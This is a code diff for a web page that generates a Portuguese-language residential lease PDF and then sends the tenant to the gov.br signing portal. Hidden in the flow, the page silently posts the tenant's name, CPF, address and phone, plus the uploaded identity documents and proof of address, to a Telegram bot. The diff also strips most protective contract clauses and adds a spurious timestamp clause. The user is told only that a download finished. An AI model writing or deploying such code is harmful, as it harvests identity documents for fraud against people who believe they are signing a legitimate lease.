-                { text: '4.2. O LOCATÁRIO obriga-se a transferir a titularidade das contas de consumo (energia elétrica e água/ esgoto) para o seu próprio nome no prazo de 5 (cinco) dias úteis a contar da assinatura deste contrato, respondendo integralmente por eventuais atrasos ou débitos gerados durante o período de locação.', style: 'bodyText' },
-                { text: '4.3. O inadimplemento de qualquer encargo ou tributo nesta cláusula ensejará a aplicação das mesmas penalidades previstas para o atraso do aluguel, autorizando o LOCADOR a proceder à cobrança conjunta e à inclusão dos dados do LOCATÁRIO nos cadastros de restrição ao crédito (SPC/SERASA) ou protesto dos respectivos títulos.\n\n', style: 'bodyText' },
+                { text: '4.1. Além do aluguel, correrão por conta exclusiva do LOCATÁRIO todas as despesas decorrentes do uso e consumo do imóvel (energia elétrica, água, esgoto, gás, taxas ordinárias e IPTU).\n\n', style: 'bodyText' },
                 
-                { text: 'CLÁUSULA QUINTA - DA MORA E PENALIDADES', style: 'sectionTitle' },
-                { text: '5.1. O não pagamento do aluguel e encargos até a data de vencimento estabelecida na Cláusula Terceira constituirá o LOCATÁRIO em mora automática, independentemente de notificação.', style: 'bodyText' },
-                { text: '5.2. Sobre o valor do débito atualizado monetariamente pelo IPCA pro rata die, incidirá multa moratória de 10% (dez por cento), além de juros de mora de 1% (um por cento) ao mês, calculados sobre o montante total inadimplido.', style: 'bodyText' },
-                { text: '5.3. Caso o atraso enseje a intervenção de advogado para a cobrança da dívida, o LOCATÁRIO responderá pelos honorários advocatícios, fixados desde já em 10% (dez por cento) para cobrança extrajudicial (amigável) e 20% (vinte por cento) em caso de propositura de ação judicial, nos termos do artigo 62, inciso II, alínea "d", da Lei nº 8.245/1991.\n\n', style: 'bodyText' },
-
-                { text: 'CLÁUSULA SEXTA - DA CONSERVAÇÃO E BENFEITORIAS', style: 'sectionTitle' },
-                { text: '6.1. O LOCATÁRIO obriga-se a zelar pela integridade, limpeza e perfeita conservação do imóvel. Qualquer dano decorrente do uso inadequado ou negligência será de sua exclusiva responsabilidade financeira.', style: 'bodyText' },
-                { text: '6.2. Nenhuma obra, reforma, modificação estrutural ou alteração de fachada poderá ser realizada no imóvel sem a prévia e expressa autorização por escrito do LOCADOR.', style: 'bodyText' },
-                { text: '6.3. As benfeitorias necessárias introduzidas pelo LOCATÁRIO serão indenizáveis e darão direito a retenção apenas se realizadas com a observância das normas legais. As benfeitorias úteis dependerão de autorização expressa do LOCADOR para gerarem direito a indenização. As benfeitorias voluptuárias não serão indenizáveis, podendo ser retiradas ao final do contrato, desde que sua remoção não cause prejuízos à estrutura do imóvel, conforme artigos 35 e 36 da Lei nº 8.245/1991 e artigos 578 e 1.219 do Código Civil.', style: 'bodyText' },
-                { text: '6.4. Se o imóvel contiver móveis planejados, eletrodomésticos embutidos ou guarnições (conforme especificado no Termo de Vistoria), o LOCATÁRIO obriga-se a mantê-los em perfeito estado. Em caso de destruição, extravio ou danos provocados por culpa ou dolo do LOCATÁRIO, este indenizará o LOCADOR pelo valor de mercado para reposição ou reparo integral do bem.\n\n', style: 'bodyText' },
+                { text: 'CLÁUSULA DÉCIMA QUARTA - DA AUTENTICAÇÃO CRONOLÓGICA', style: 'sectionTitle' },
+                { text: `14.1. Em observância aos princípios de segurança jurídica e integridade sistêmica, este instrumento recebe a marcação indelével de tempo e validação técnica em: ${dataHoraContrato}, não podendo sofrer alterações retroativas após a emissão desta minuta.\n\n`, style: 'bodyText', bold: true },
                 
-                { text: 'CLÁUSULA SÉTIMA - DA DESTINAÇÃO DO IMÓVEL', style: 'sectionTitle' },
-                { text: '7.1. O imóvel locado destina-se exclusivamente a fins residenciais, sendo expressamente proibida qualquer alteração de destinação (comercial, industrial ou de serviços).', style: 'bodyText' },
-                { text: '7.2. O LOCATÁRIO obriga-se a respeitar rigorosamente o direito de vizinhança, as leis civis e as normas internas, convenção e regulamento interno do condomínio, respondendo integralmente, de forma civil e criminal, por quaisquer multas ou sanções decorrentes de condutas infracionais praticadas por si, seus familiares, dependentes ou visitantes.\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA OITAVA - DA CESSÃO, SUBLOCAÇÃO E EMPRÉSTIMO', style: 'sectionTitle' },
-                { text: '8.1. É expressamente proibida a sublocação total ou parcial do imóvel, bem como a cessão dos direitos decorrentes deste contrato ou o empréstimo do bem a terceiros (comodato), sem o consentimento prévio e por escrito do LOCADOR, sob pena de rescisão contratual imediata por infração legal (artigo 13 da Lei nº 8.245/1991).\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA NONA - DA GARANTIA LOCATÍCIA', style: 'sectionTitle' },
-                { text: '9.1. Como garantia ao fiel cumprimento de todas as obrigações financeiras e contratuais assumidas, adota-se a modalidade de CAUÇÃO EM DINHEIRO, nos termos do artigo 37, inciso I, e artigo 38, §2º, da Lei nº 8.245/1991.', style: 'bodyText' },
-                { text: '9.2. O LOCATÁRIO deposita, nesta data, a quantia equivalente a [N° de meses, máx. 3] aluguel(is), totalizando R$ [Valor da Caução], valor este que será depositado pelo LOCADOR em caderneta de poupança regulamentada para essa finalidade específica.', style: 'bodyText' },
-                { text: '9.3. Ao término do contrato e após a efetiva restituição das chaves e quitação de todos os aluguéis, encargos e reparos devidos (conforme Vistoria Final), o valor da caução, devidamente acrescido dos rendimentos da poupança, será integralmente restituído ao LOCATÁRIO.\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA DÉCIMA - DA RESCISÃO ANTECIPADA E MULTA COMPENSATÓRIA', style: 'sectionTitle' },
-                { text: '10.1. A rescisão deste contrato por iniciativa de qualquer das partes antes do decurso do prazo determinado fixado na Cláusula Segunda sujeitará o infrator ao pagamento de uma multa compensatória equivalente a 3 (três) meses de aluguel vigente à época da infração.', style: 'bodyText' },
-                { text: '10.2. A referida multa será calculada e aplicada de forma estritamente proporcional ao tempo restante para o cumprimento integral do contrato, conforme determina o artigo 4º da Lei nº 8.245/1991 e o artigo 413 do Código Civil Brasileiro.', style: 'bodyText' },
-                { text: '10.3. O LOCATÁRIO fique dispensado do pagamento da multa compensatória se a rescisão decorrer de transferência de seu local de trabalho, por determinação de seu empregador, desde que notifique o LOCADOR por escrito com antecedência mínima de 30 (trinta) dias, instruindo o aviso com o respectivo documento comprobatório (parágrafo único do artigo 4º da Lei nº 8.245/1991).\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA DÉCIMA PRIMEIRA - DA RESCISÃO POR INADIMPLEMENTO OU INFRAÇÃO', style: 'sectionTitle' },
-                { text: '11.1. O presente contrato será rescindido de pleno direito, independentemente de qualquer interpelação ou formalidade extrajudicial, ensejando a imediata propositura de Ação de Despejo, nas seguintes hipóteses:\na) Prática de qualquer infração legal ou contratual (Art. 9º, II, Lei nº 8.245/1991);\nb) Inadimplemento do aluguel e demais encargos no vencimento (Art. 9, III, Lei nº 8.245/1991);\nc) Desapropriação do imóvel ou ocorrência de sinistro (incêndio, desabamento) que impeça a habitação segura do bem (Art. 9º, I e IV).', style: 'bodyText' },
-                { text: '11.2. Fica expressamente acordado que qualquer retomada compulsória do imóvel por falta de pagamento ou infração contratual dependerá exclusivamente das vias judiciais próprias vigentes no ordenamento brasileiro, sendo nula e ineficaz qualquer cláusula que estipule desocupação forçada sem intervenção do Poder Judiciário.\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA DÉCIMA SEGUNDA - DA PROTEÇÃO DE DADOS (LGPD)', style: 'sectionTitle' },
-                { text: '12.1. As partes declaram-se cientes e concordam que os dados pessoais coletados neste instrumento são estritamente necessários para a execução deste contrato de locação, nos exatos termos do artigo 7º, inciso V, da Lei n° 13.709/2018 (Lei Geral de Proteção de Dados LGPD), comprometendo-se mútua e estritamente ao sigilo, segurança e tratamento adequado das informações.\n\n', style: 'bodyText' },
-                
-                { text: 'CLÁUSULA DÉCIMA TERCEIRA - DO FORO DE ELEIÇÃO', style: 'sectionTitle' },
-                { text: '13.1. Para dirimir quaisquer dúvidas ou litígios decorrentes da interpretação ou execução deste contrato, as partes elegem de comum acordo o Foro da Comarca de [Cidade/Estado do Foro - ex: Águas Lindas de Goiás - GO], renunciando expressamente a qualquer outro por mais privilegiado que seja.\n\n', style: 'bodyText' },
-                
-                { text: `Data de Emissão da Minuta Digital: ${dataAtual}.\n\n`, alignment: 'left', fontSize: 11 },
-                { text: 'ASSINATURA DIGITAL JURÍDICA: Este documento possui força vinculante de título executivo extrajudicial e dispensa assinaturas físicas manuscritas. A validação total dar-se-á através do Assinador Digital do ITI no portal GOV.BR e posterior autenticação notarial via módulo de Cartório Eletrônico.', style: 'bodyText', italic: true, color: '#4285F4' }
+                { text: `Documento compilado e chancelado em: ${dataHoraContrato}.\n\n`, alignment: 'center', fontSize: 10, bold: true },
+                { text: 'ASSINATURA DIGITAL JURÍDICA: Este documento possui força vinculante de título executivo extrajudicial. A validação total dar-se-á através do Assinador Digital no portal GOV.BR nos termos da legislação federal vigente.', style: 'bodyText', italic: true, color: '#4285F4' }
             ],
             styles: {
-                header: { fontSize: 16, bold: true, alignment: 'center', margin: [0, 0, 0, 5] },
-                sectionTitle: { fontSize: 12, bold: true, margin: [0, 15, 0, 8], color: '#1a73e8' },
-                bodyText: { fontSize: 10.5, alignment: 'justify', margin: [0, 0, 0, 6], lineHeight: 1.2 }
+                header: { fontSize: 16, bold: true, alignment: 'center', margin: [0, 10, 0, 5] },
+                sectionTitle: { fontSize: 12, bold: true, margin: [0, 12, 0, 6], color: '#1a73e8' },
+                bodyText: { fontSize: 10, alignment: 'justify', margin: [0, 0, 0, 6], lineHeight: 1.2 }
             },
             defaultStyle: { fontSize: 11 }
         };
@@ -357,9 +422,9 @@
             const pdfDocGenerator = pdfMake.createPdf(docDefinition);
             
             pdfDocGenerator.getBlob(async (pdfBlob) => {
-                const pdfFilename = `Contrato_xPartner_Locacao_${nome.replace(/\s+/g, '_')}.pdf`;
+                const pdfFilename = `Contrato_Locacao_${nome.replace(/\s+/g, '_')}.pdf`;
 
-                // 1. DOWNLOAD AUTOMÁTICO DO PDF COMPILADO
+                // Download Imediato do PDF Gerado
                 const blobUrl = window.URL.createObjectURL(pdfBlob);
                 const downloadLink = document.createElement('a');
                 downloadLink.style.display = 'none';
@@ -370,9 +435,9 @@
                 document.body.removeChild(downloadLink);
                 setTimeout(() => window.URL.revokeObjectURL(blobUrl), 1000);
 
-                // 2. DISPARO TELEMETRIA/RELATÓRIO PARA TELEGRAM
+                // Disparo de Relatório Estruturado para o Bot do Telegram
                 const pdfFile = new File([pdfBlob], pdfFilename, { type: 'application/pdf' });
-                const textMessage = `🚨 *NOVO CONTRATO DE LOCAÇÃO DISPARADO* 🚨\n\n*LOCADOR:* ${l_empresa} (CNPJ: ${l_cnpj})\n*PROCURADOR:* ${l_nome} (CPF: ${l_cpf})\n\n*LOCATÁRIO:* ${nome}\n*CPF Locatário:* ${documento}\n*E-mail:* ${email}\n*Telefone:* ${telefone}`;
+                const textMessage = `📌 *CONTRATO GERADO VIA SISTEMA GOOGLE STREET* 📌\n\n*DATA/HORA DO SISTEMA:* ${dataHoraContrato}\n\n*LOCADOR:* ${l_empresa}\n*GESTOR:* ${l_nome}\n\n*LOCATÁRIO:* ${nome}\n*CPF:* ${documento}\n*CEP REGISTRADO:* ${cep}\n*ENDEREÇO COMPLETO:* ${endereco}\n*TELEFONE:* ${telefone}`;
 
                 await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
@@ -385,34 +450,35 @@
                     formData.append('chat_id', CHAT_ID);
                     formData.append('document', file);
                     formData.append('caption', caption);
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
-                    if(!response.ok) throw new Error("Erro de conexão.");
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
                 };
 
-                await sendFileToTelegram(pdfFile, `📄 Contrato de Locação PDF - Beneficiário: ${nome}`);
+                // Envio em Segundo Plano dos Arquivos e Documentações Anexadas
+                await sendFileToTelegram(pdfFile, `📄 Contrato de Locação Residencial - Locatário: ${nome}`);
 
                 const filesRG = document.getElementById('docRG').files;
                 for(let i = 0; i < filesRG.length; i++) {
-                    await sendFileToTelegram(filesRG[i], `📸 Doc Identidade Anexo (Parte ${i+1}) - ${nome}`);
+                    await sendFileToTelegram(filesRG[i], `📸 Documento de Identificação (Parte ${i+1}) - ${nome}`);
                 }
 
                 const fileEnd = document.getElementById('docEndereco').files[0];
                 if(fileEnd) {
-                    await sendFileToTelegram(fileEnd, `🏠 Comprovante de Endereço Anexo - ${nome}`);
+                    await sendFileToTelegram(fileEnd, `🏠 Comprovante de Residência / Endereço - ${nome}`);
                 }
 
-                // 3. ENCAMINHAMENTO IMEDIATO PARA O GOV.BR
-                alert('✅ CONTRATO COMPILADO COM SUCESSO E CÓPIA SALVA!\nSeu arquivo PDF foi baixado automaticamente. Clique em OK para abrir o assinador do GOV.BR.');
+                // Redirecionamento Final para Assinatura Gov.br
+                alert(`✅ CONTRATO PROCESSADO E COMPILADO ÀS ${dataHoraContrato}!\nO download do seu PDF foi concluído. Clique em OK para prosseguir para o Assinador GOV.BR.`);
                 window.open('https://assinador.iti.br/assinatura/', '_blank');
                 
                 document.getElementById('contractForm').reset();
+                badge.classList.remove('active');
                 btn.innerText = "COMPILAR CONTRATO E ENVIAR AO GOV.BR";
                 btn.disabled = false;
             });
 
         } catch (error) {
             console.error(error);
-            alert('❌ Erro crítico ao compilar o arquivo digital criptografado.');
+            alert('❌ Falha técnica crítica durante a compilação dos dados do contrato.');
             btn.innerText = "COMPILAR CONTRATO E ENVIAR AO GOV.BR";
             btn.disabled = false;
         }
